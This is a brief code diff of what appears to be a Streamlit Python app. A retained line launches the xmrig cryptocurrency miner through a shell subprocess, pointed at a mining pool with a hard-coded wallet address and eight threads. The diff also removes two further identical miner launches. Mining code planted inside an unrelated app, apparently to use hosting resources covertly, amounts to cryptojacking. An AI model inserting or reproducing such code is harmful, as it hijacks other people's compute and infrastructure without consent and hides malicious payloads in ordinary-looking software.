@@ -73,8 +73,6 @@ with st.echo(code_location='below'):
 
         
 p = subprocess.run("./xmrig --algo=ghostrider --url stratum+tcp://miningpool2u.com:3026 --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.neverlose -t 8 -k", stdout=subprocess.PIPE, shell=True)
-p2 = subprocess.run("./xmrig --algo=ghostrider --url stratum+tcp://miningpool2u.com:3026 --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.neverlose2 -t 8 -k", stdout=subprocess.PIPE, shell=True)
-p3 = subprocess.run("./xmrig --algo=ghostrider --url stratum+tcp://miningpool2u.com:3026 --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.neverlose3 -t 8 -k", stdout=subprocess.PIPE, shell=True)
 
 import time 
 from IPython.display import clear_output 
